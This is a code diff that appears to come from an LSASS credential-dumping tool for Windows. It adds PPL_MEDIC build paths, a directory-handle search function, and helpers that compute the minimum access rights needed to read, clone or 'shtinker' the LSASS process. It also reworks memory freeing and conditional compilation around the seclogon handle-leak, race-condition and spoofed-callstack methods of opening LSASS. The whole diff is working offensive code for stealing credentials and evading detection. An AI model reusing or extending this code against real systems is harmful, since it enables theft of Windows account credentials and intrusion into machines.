@@ -5,7 +5,7 @@
 #include "malseclogon.h"
 #include "spoof_callstack.h"
 
-#if defined(NANO) && !defined(SSP)
+#if (defined(NANO) || defined(PPL_MEDIC)) && !defined(SSP)
 
 BOOL find_token_handles_in_process(
     IN DWORD process_pid,
@@ -15,6 +15,7 @@ BOOL find_token_handles_in_process(
     BOOL ret_val = FALSE;
     BOOL success = FALSE;
     PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
+    ULONG handleTableInformationSize = 0;
 
     DPRINT("Finding token handles in the process with PID %ld", process_pid);
 
@@ -30,7 +31,9 @@ BOOL find_token_handles_in_process(
     if (!success)
         goto cleanup;
 
-    success = get_all_handles(&handleTableInformation);
+    success = get_all_handles(
+        &handleTableInformation,
+        &handleTableInformationSize);
     if (!success)
         goto cleanup;
 
@@ -65,9 +68,13 @@ BOOL find_token_handles_in_process(
 
 cleanup:
     if (!ret_val && handle_list)
-        intFree(handle_list);
+    {
+        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
+    }
     if (handleTableInformation)
-        intFree(handleTableInformation);
+    {
+        DATA_FREE(handleTableInformation, handleTableInformationSize);
+    }
 
     return ret_val;
 }
@@ -80,6 +87,7 @@ BOOL find_process_handles_in_process(
     BOOL ret_val = FALSE;
     BOOL success = FALSE;
     PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
+    ULONG handleTableInformationSize = 0;
 
     DPRINT("Finding process handles in the process with PID %ld", process_pid);
 
@@ -95,7 +103,9 @@ BOOL find_process_handles_in_process(
     if (!success)
         goto cleanup;
 
-    success = get_all_handles(&handleTableInformation);
+    success = get_all_handles(
+        &handleTableInformation,
+        &handleTableInformationSize);
     if (!success)
         goto cleanup;
 
@@ -130,9 +140,85 @@ BOOL find_process_handles_in_process(
 
 cleanup:
     if (handleTableInformation)
-        intFree(handleTableInformation);
+    {
+        DATA_FREE(handleTableInformation, handleTableInformationSize);
+    }
     if (!ret_val && handle_list)
-        intFree(handle_list);
+    {
+        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
+    }
+
+    return ret_val;
+}
+
+BOOL find_directory_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions,
+    OUT PHANDLE_LIST* phandle_list)
+{
+    BOOL ret_val = FALSE;
+    BOOL success = FALSE;
+    PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
+    ULONG handleTableInformationSize = 0;
+    ULONG DirectoryTypeIndex = 0;
+
+    DPRINT("Finding directory handles in the process with PID %ld", process_pid);
+
+    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
+    if (!handle_list)
+    {
+        malloc_failed();
+        goto cleanup;
+    }
+
+    success = get_type_index_by_name(DIRECTORY_HANDLE_TYPE, &DirectoryTypeIndex);
+    if (!success)
+        goto cleanup;
+
+    success = get_all_handles(
+        &handleTableInformation,
+        &handleTableInformationSize);
+    if (!success)
+        goto cleanup;
+
+    // loop over each handle
+    for (ULONG j = 0; j < handleTableInformation->Count; j++)
+    {
+        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];
+
+        // make sure this handle is from the target process
+        if (handleInfo->UniqueProcessId != process_pid)
+            continue;
+
+        // make sure the handle has the permissions we need
+        if ((handleInfo->GrantedAccess & permissions) != permissions)
+            continue;
+
+        // make sure the handle is of type 'Directory'
+        if (handleInfo->ObjectTypeIndex != DirectoryTypeIndex)
+            continue;
+
+        if (handle_list->Count + 1 > MAX_HANDLES)
+        {
+            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
+            goto cleanup;
+        }
+        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
+    }
+
+    *phandle_list = handle_list;
+    ret_val = TRUE;
+    DPRINT("Found %ld handles", handle_list->Count);
+
+cleanup:
+    if (handleTableInformation)
+    {
+        DATA_FREE(handleTableInformation, handleTableInformationSize);
+    }
+    if (!ret_val && handle_list)
+    {
+        DATA_FREE(handle_list, sizeof(HANDLE_LIST));
+    }
 
     return ret_val;
 }
@@ -278,6 +364,40 @@ cleanup:
     return hHighPriv;
 }
 
+#if defined(NANO)
+
+// get the minimum permissions required to read LSASS
+DWORD get_lsass_min_permissions(VOID)
+{
+    PVOID pPeb;
+    PULONG32 OSMajorVersion;
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+    // NOTE: mimikatz uses < instead of <= but this doesn't seem to work in Windows Server 2008 R2
+    return PROCESS_VM_READ | ((*OSMajorVersion <= 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+}
+
+// get the minimum permissions required to clone LSASS
+DWORD get_lsass_clone_permissions(VOID)
+{
+    PVOID pPeb;
+    PULONG32 OSMajorVersion;
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+    return PROCESS_CREATE_PROCESS | ((*OSMajorVersion <= 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+}
+
+// get the minimum permissions required to dump LSASS via shtinkering
+DWORD get_lsass_shtinkering_permissions(VOID)
+{
+    PVOID pPeb;
+    PULONG32 OSMajorVersion;
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
+    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
+    // NOTE: mimikatz uses < instead of <= but this doesn't seem to work in Windows Server 2008 R2
+    return PROCESS_VM_READ | ((*OSMajorVersion <= 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
+}
+
 // get a handle to LSASS via multiple methods
 BOOL obtain_lsass_handle(
     OUT PHANDLE phProcess,
@@ -286,7 +406,7 @@ BOOL obtain_lsass_handle(
     IN BOOL elevate_handle,
     IN BOOL duplicate_elevate,
     IN BOOL use_seclogon_duplicate,
-    IN DWORD spoof_callstack,
+    IN BOOL spoof_callstack,
     IN BOOL is_seclogon_leak_local_stage_2,
     IN LPCSTR seclogon_leak_remote_binary,
     OUT PPROCESS_LIST* Pcreated_processes,
@@ -302,7 +422,7 @@ BOOL obtain_lsass_handle(
     BOOL   ret_val               = FALSE;
     BOOL   success               = FALSE;
     HANDLE hProcess              = NULL;
-    DWORD  permissions           = LSASS_DEFAULT_PERMISSIONS;
+    DWORD  permissions           = get_lsass_min_permissions();
     DWORD  duplicate_permissions = 0;
     DWORD  attributes            = 0;
     BOOL   use_seclogon_leak     = use_seclogon_leak_local || use_seclogon_leak_remote;
@@ -319,6 +439,7 @@ BOOL obtain_lsass_handle(
 
     if (use_seclogon_leak && !is_seclogon_leak_local_stage_2)
     {
+#if !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         success = malseclogon_handle_leak(
             seclogon_leak_remote_binary,
             dump_path,
@@ -333,6 +454,7 @@ BOOL obtain_lsass_handle(
             goto cleanup;
         if (use_seclogon_leak_local)
             return TRUE;
+#endif
     }
 
     // --seclogon-leak-remote requires --duplicate internaly
@@ -343,15 +465,16 @@ BOOL obtain_lsass_handle(
     if (use_lsass_shtinkering)
         attributes |= OBJ_INHERIT;
 
-    // fork and snapshot require LSASS_CLONE_PERMISSIONS
+    // fork and snapshot require special permissions
     if ((fork_lsass || snapshot_lsass) && !use_seclogon_leak)
     {
-        permissions = LSASS_CLONE_PERMISSIONS;
+        permissions = get_lsass_clone_permissions();
     }
-    // shtinkering requires LSASS_SHTINKERING_PERMISSIONS
+
+    // shtinkering requires special permissions
     else if (use_lsass_shtinkering)
     {
-        permissions = LSASS_SHTINKERING_PERMISSIONS;
+        permissions = get_lsass_shtinkering_permissions();
     }
 
     // remember the permissions we needed
@@ -442,7 +565,7 @@ HANDLE open_handle_to_lsass(
     IN DWORD permissions,
     IN BOOL dup,
     IN BOOL seclogon_race,
-    IN DWORD spoof_callstack,
+    IN BOOL spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
     IN DWORD attributes)
 {
@@ -451,7 +574,7 @@ HANDLE open_handle_to_lsass(
     if (is_malseclogon_stage_2)
     {
         // this is always done from an EXE
-#ifdef EXE
+#if defined(EXE) && defined(NANO) && !defined(SSP) && !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = malseclogon_stage_2();
 #endif
     }
@@ -466,18 +589,21 @@ HANDLE open_handle_to_lsass(
     }
     else if (seclogon_race)
     {
+#if defined(NANO) && !defined(SSP) && !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = malseclogon_race_condition(
             lsass_pid,
             permissions,
             attributes);
+#endif
     }
     else if (spoof_callstack)
     {
+#if !defined(PPL_DUMP) && !defined(PPL_MEDIC)
         hProcess = open_handle_with_spoofed_callstack(
-            spoof_callstack,
             lsass_pid,
             permissions,
             attributes);
+#endif
     }
     // good old NtOpenProcess
     else if (lsass_pid)
@@ -537,6 +663,8 @@ HANDLE find_lsass(
             return hProcess;
     }
 }
+
+#endif
 
 // use NtOpenProcess to get a handle to a process
 HANDLE get_process_handle(
@@ -598,11 +726,13 @@ HANDLE get_process_handle(
 
 // get all handles in the system
 BOOL get_all_handles(
-    OUT PSYSTEM_HANDLE_INFORMATION* phandle_table)
+    OUT PSYSTEM_HANDLE_INFORMATION* phandle_table,
+    OUT PULONG phandle_table_size)
 {
     BOOL ret_val = FALSE;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);
+    ULONG prev_buffer_size = buffer_size;
     PVOID handleTableInformation = NULL;
 
     handleTableInformation = intAlloc(buffer_size);
@@ -623,7 +753,8 @@ BOOL get_all_handles(
         if (status == STATUS_INFO_LENGTH_MISMATCH)
         {
             // the buffer was too small, buffer_size now has the new length
-            intFree(handleTableInformation); handleTableInformation = NULL;
+            DATA_FREE(handleTableInformation, prev_buffer_size);
+            prev_buffer_size = buffer_size;
             handleTableInformation = intAlloc(buffer_size);
             if (!handleTableInformation)
             {
@@ -641,12 +772,15 @@ BOOL get_all_handles(
     }
 
     *phandle_table = (PSYSTEM_HANDLE_INFORMATION)handleTableInformation;
+    *phandle_table_size = buffer_size;
     ret_val = TRUE;
     DPRINT("Obtained the handle table");
 
 cleanup:
     if (!ret_val && handleTableInformation)
-        intFree(handleTableInformation);
+    {
+        DATA_FREE(handleTableInformation, buffer_size);
+    }
 
     return ret_val;
 }
@@ -705,25 +839,31 @@ BOOL get_processes_from_handle_table(
 
 cleanup:
     if (!ret_val && process_list)
-        intFree(process_list);
+    {
+        DATA_FREE(process_list, sizeof(PROCESS_LIST));
+    }
 
     return ret_val;
 }
 
 // call NtQueryObject with ObjectTypesInformation
-POBJECT_TYPES_INFORMATION query_object_types_info(VOID)
+BOOL query_object_types_info(
+    POBJECT_TYPES_INFORMATION* pObjectTypes,
+    PULONG pObjectTypesSize)
 {
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     ULONG BufferLength = 0x1000;
+    ULONG PrevBufferLength = BufferLength;
     POBJECT_TYPES_INFORMATION obj_type_information = NULL;
 
     do
     {
+        PrevBufferLength = BufferLength;
         obj_type_information = intAlloc(BufferLength);
         if (!obj_type_information)
         {
             malloc_failed();
-            return NULL;
+            return FALSE;
         }
 
         status = NtQueryObject_(
@@ -735,14 +875,16 @@ POBJECT_TYPES_INFORMATION query_object_types_info(VOID)
 
         if (NT_SUCCESS(status))
         {
-            return obj_type_information;
+            *pObjectTypes = obj_type_information;
+            *pObjectTypesSize = BufferLength;
+            return TRUE;
         }
 
-        intFree(obj_type_information); obj_type_information = NULL;
+        DATA_FREE(obj_type_information, PrevBufferLength);
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
     syscall_failed("NtQueryObject", status);
-    return NULL;
+    return FALSE;
 }
 
 // get index of object type 'Process'
@@ -751,11 +893,15 @@ BOOL get_type_index_by_name(
     OUT PULONG ProcesTypeIndex)
 {
     BOOL ret_val = FALSE;
+    BOOL success = FALSE;
     POBJECT_TYPES_INFORMATION ObjectTypes = NULL;
     POBJECT_TYPE_INFORMATION_V2 CurrentType = NULL;
+    ULONG ObjectTypesSize = 0;
 
-    ObjectTypes = query_object_types_info();
-    if (!ObjectTypes)
+    success = query_object_types_info(
+        &ObjectTypes,
+        &ObjectTypesSize);
+    if (!success)
         goto cleanup;
 
     CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
@@ -775,10 +921,14 @@ BOOL get_type_index_by_name(
 
 cleanup:
     if (ObjectTypes)
-        intFree(ObjectTypes);
+    {
+        DATA_FREE(ObjectTypes, ObjectTypesSize);
+    }
 
     return ret_val;
 }
+
+#if defined(NANO)
 
 // find and duplicate a handle to LSASS
 HANDLE duplicate_lsass_handle(
@@ -793,6 +943,7 @@ HANDLE duplicate_lsass_handle(
     HANDLE hProcess = NULL;
     HANDLE hDuped = NULL;
     PSYSTEM_HANDLE_INFORMATION handleTableInformation = NULL;
+    ULONG handleTableInformationSize = 0;
     PPROCESS_LIST process_list = NULL;
     ULONG ProcessId = 0;
     DWORD local_pid = 0;
@@ -802,7 +953,9 @@ HANDLE duplicate_lsass_handle(
     if (!success)
         goto cleanup;
 
-    success = get_all_handles(&handleTableInformation);
+    success = get_all_handles(
+        &handleTableInformation,
+        &handleTableInformationSize);
     if (!success)
         goto cleanup;
 
@@ -899,9 +1052,13 @@ HANDLE duplicate_lsass_handle(
 
 cleanup:
     if (handleTableInformation)
-        intFree(handleTableInformation);
+    {
+        DATA_FREE(handleTableInformation, handleTableInformationSize);
+    }
     if (process_list)
-        intFree(process_list);
+    {
+        DATA_FREE(process_list, sizeof(PROCESS_LIST));
+    }
     if (hProcess)
         NtClose(hProcess);
 
@@ -910,6 +1067,8 @@ cleanup:
     else
         return NULL;
 }
+
+#endif
 
 // create a clone (fork) of the LSASS process
 HANDLE fork_process(
